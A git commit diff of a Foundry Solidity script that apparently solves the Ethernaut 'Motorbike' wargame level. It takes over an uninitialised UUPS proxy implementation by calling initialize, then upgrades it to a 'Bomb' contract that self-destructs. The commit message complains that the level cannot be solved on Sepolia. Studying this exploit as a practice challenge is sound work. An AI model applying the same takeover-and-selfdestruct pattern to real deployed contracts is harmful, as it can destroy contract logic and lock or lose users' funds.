fe061e26bc80eb45bd3ffa1a76ad01b548f629d7
Your Name <you@example.com>
2026-01-08 10:10:21 -0500

    motorbike is unsolvable in sepolia at least

--- script/Motorbike.s.sol
+++ script/Motorbike.s.sol
@@ -5,9 +5,6 @@ import {Script, console} from "forge-std/Script.sol";
 import { Motorbike, Engine, myMaliciousEngine } from "../src/Motorbike.sol";
 
 contract Bomb {
-
-    constructor () public {}
-
     fallback () external {
         selfdestruct(msg.sender);
     }
@@ -16,8 +13,8 @@ contract Bomb {
 
 contract MotorbikeSolver is Script {
 
-    // Motorbike public instance = Motorbike(0xc4247B4b2F26DF92854BE78aE362289C75c92fd2);
-    Motorbike public instance = new Motorbike(address(new Engine()));
+    Motorbike public instance = Motorbike(0xc4247B4b2F26DF92854BE78aE362289C75c92fd2);
+    // Motorbike public instance = new Motorbike(address(new Engine()));
 
     bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
@@ -33,32 +30,21 @@ contract MotorbikeSolver is Script {
 
         Engine engine = Engine(address(uint160(uint256(engineAddress))));
         
-        console.log(engine.upgrader());
         
-        engine.initialize();
-        console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
+        // engine.initialize();
+        // console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
 
         
         Bomb bomb = new Bomb();
-        myMaliciousEngine myEngine = new myMaliciousEngine();
-        engine.upgradeToAndCall(
-            address(myEngine),
-            ""
-        );
+        engine.initialize();
+		engine.upgradeToAndCall(address(bomb), "");
 
+		// sepolia doesnt allow us to solve this chal !!!
 
-        myEngine.initialize(address(instance));
-
-        // engine.upgradeToAndCall(address(myEngine), "");
-
-        // console.log(myEngine.upgrader());
-        address(instance).call(abi.encodeWithSelector(myEngine.upgradeToAndCall.selector, address(bomb), ""));
-
-        console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
+        // console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));
 
 
 
-        console.log(engine.upgrader());
 
         vm.stopBroadcast();
 
